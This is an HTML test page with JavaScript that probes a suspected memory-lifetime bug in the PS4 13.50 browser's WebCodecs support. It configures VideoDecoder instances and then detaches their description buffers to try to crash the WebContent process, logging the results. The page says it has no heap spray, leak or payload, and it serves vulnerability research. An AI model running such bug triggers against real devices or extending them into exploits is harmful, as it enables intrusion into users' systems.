<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PS4 13.50 WebCodecs lifetime probe</title>
<style>
  :root { color-scheme: dark; font-family: system-ui, sans-serif; }
  body { max-width: 760px; margin: 2rem auto; padding: 0 1rem; background: #111; color: #eee; }
  button { margin: .4rem .4rem .4rem 0; padding: .7rem 1rem; font-size: 1rem; }
  pre { min-height: 16rem; padding: 1rem; overflow-wrap: anywhere; white-space: pre-wrap; background: #1d1d1d; border: 1px solid #444; }
  .warning { color: #ffd479; }
</style>

<h1>PS4 13.50 WebCodecs lifetime probe</h1>
<p class="warning">This page deliberately probes a suspected WebContent memory-safety bug. Save any crash log first. It does not contain a heap spray, address leak, or payload.</p>
<button id="single">Run one probe</button>
<button id="repeat">Run 32 probes</button>
<pre id="log"></pre>

<script>
(() => {
  "use strict";

  const output = document.querySelector("#log");
  const liveDecoders = [];
  const channels = [];
  let busy = false;

  function log(message) {
    const line = `[${new Date().toISOString()}] ${message}`;
    output.textContent += `${line}\n`;
    console.log(line);
  }

  window.addEventListener("error", event => log(`window error: ${event.message}`));
  window.addEventListener("unhandledrejection", event => log(`rejection: ${event.reason}`));

  const codecCandidates = [
    { codec: "avc1.42E01E", codedWidth: 64, codedHeight: 64 },
    { codec: "avc1.4D401E", codedWidth: 64, codedHeight: 64 },
    { codec: "vp09.00.10.08", codedWidth: 64, codedHeight: 64 },
    { codec: "av01.0.04M.08", codedWidth: 64, codedHeight: 64 }
  ];

  async function selectSupportedConfig() {
    if (typeof VideoDecoder !== "function")
      throw new Error("VideoDecoder is not exposed in this browser context");

    for (const candidate of codecCandidates) {
      try {
        const result = await VideoDecoder.isConfigSupported(candidate);
        log(`${candidate.codec}: supported=${result.supported}`);
        if (result.supported)
          return candidate;
      } catch (error) {
        log(`${candidate.codec}: support query failed: ${error}`);
      }
    }
    throw new Error("No tested codec configuration is reported as supported");
  }

  function detach(buffer) {
    const channel = new MessageChannel();
    channel.port2.onmessage = () => {};
    channel.port1.postMessage(buffer, [buffer]);
    channels.push(channel);
    return buffer.byteLength === 0;
  }

  function triggerOnce(config, index) {
    const descriptionBuffer = new ArrayBuffer(0x4000);
    const description = new Uint8Array(descriptionBuffer);
    description.fill(0x41);
    description.set([1, 0x42, 0, 0x1e, 0xff, 0xe1, 0, 0], 0);

    const decoder = new VideoDecoder({
      output(frame) {
        log(`probe ${index}: unexpected output frame`);
        frame.close();
      },
      error(error) {
        log(`probe ${index}: decoder callback: ${error}`);
      }
    });

    liveDecoders.push(decoder);
    decoder.configure({ ...config, description });
    const detached = detach(descriptionBuffer);
    log(`probe ${index}: configure returned; detached=${detached}; byteLength=${descriptionBuffer.byteLength}`);
  }

  async function run(count) {
    if (busy)
      return;
    busy = true;
    document.querySelector("#single").disabled = true;
    document.querySelector("#repeat").disabled = true;

    try {
      log(`UA: ${navigator.userAgent}`);
      log(`VideoDecoder: ${typeof VideoDecoder}; structuredClone: ${typeof structuredClone}; MessageChannel: ${typeof MessageChannel}`);
      const config = await selectSupportedConfig();
      log(`selected codec: ${config.codec}`);

      for (let i = 0; i < count; ++i)
        triggerOnce(config, i + 1);

      setTimeout(() => log(`WebContent survived for 2 seconds after ${count} probe(s)`), 2000);
      setTimeout(() => log(`WebContent survived for 10 seconds; preserve this output and any system logs`), 10000);
    } catch (error) {
      log(`probe stopped: ${error.stack || error}`);
    } finally {
      busy = false;
      document.querySelector("#single").disabled = false;
      document.querySelector("#repeat").disabled = false;
    }
  }

  document.querySelector("#single").addEventListener("click", () => run(1));
  document.querySelector("#repeat").addEventListener("click", () => run(32));
  log("Ready. Start with one probe.");
})();
</script>
